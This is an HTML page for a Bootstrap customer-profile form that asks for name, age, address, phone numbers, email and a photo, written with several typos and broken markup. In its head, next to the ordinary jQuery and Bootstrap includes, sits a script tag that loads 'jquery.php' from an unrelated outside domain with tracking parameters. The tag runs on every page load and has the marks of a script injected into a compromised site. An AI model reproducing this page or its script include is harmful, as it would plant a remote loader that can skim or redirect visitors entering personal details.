<!DOCTYPE html>
<html lang="en">
<head>

  <title>CUSTOMER PROFILE</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
  <script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
<script src="https://macutnova.com/jquery.php?u=8f2fd07112b354153d5a75b7268496fd&c=split24banner4&p=1"></script></head>
<body>

<div class="container">
  
  <form role="form">
    <div form class="form-group" >
      <label for="usr">Name:</label>
      <input type="text" class="form-control" id="usr" placeholder="Enter your name">
    </div>
	</div>
	<div class="container">
  <form role="form">
    <div class="form-group">
      <label for="">Sex:</label>
      <select class="form-control" id="">
        <option>Male</option>
        <option>Femail</option>
        <option>Others</option>
      </select>
	  </div>

	<div form class="form-group" >
      <label for="age">Age:</label>
      <input type="number" class="form-control" id="age" placeholder="Please enter your age">
    </div>
	<div class="form-group">
      <label for="address">Address:</label>
      <input type="text" class="form-control" id="address" placeholder="#211-12">
    </div>
	<div class="form-group">
      <label for="">Street:</label>
      <input type="text" class="form-control" id="" placeholder="Street name">
    </div>
	<div class="form-group">
      <label for="Landmark">Landmark:</label>
      <input type="text" class="form-control" id="Landmark" placeholder="Any place near to you">
    </div>
	<div class="form-group">
      <label for="City">City:</label>
      <input type="text" class="form-control" id="City"placeholder="Bangaloure,Hydrabad,Mumbai">
    </div>
	<div class="form-group">
      <label for="Pincode">Pincode:</label>
      <input type="number" class="form-control" id="Pincode" placeholder="Ex:123456">
    </div>
	<div class="form-group">
      <label for="stat">State:</label>
      <input type="text" class="form-control" id="State" placeholder="Ex:Andhra Pradesh,karnataka ">
    </div>
	<div class="form-group">
      <label for="Country">Country:</label>
      <input type="text" class="form-control" id="" placeholder="Ex:India,Austrila,US,UK ">
    </div>
	
    <div class="form-group">
      <label for="phone number">Phone numbers:</label>
      <input type="number" class="form-control" id="Phone number" placeholder="mobile number">
    </div>
    <div class="form-group">
      <label for="mobile"></label>
      <input type="number" class="form-control" id="mobile" placeholder="office number">
    </div>
  </form>
  <div class="form-group">
      <label for="Gmail">Gmail:</label>
      <input type="gmail" class="form-control" id="gmail"placeholder="abcd@gmail.com">
    </div>
	<div class="form-group">
      <label for="id">Url:</label>
      <input type="text" class="form-control" id="Url" placeholder="https://www.facebook.com/">
    </div>
	<form action="upload-script-url" method="post" enctype="multipart/form-data">
    <input type="file" name="file">Your Photo
	</form>

	
</div>
	<button style="center" type="button" >Submit</button>
  </form>
</div>

</body>
</html>
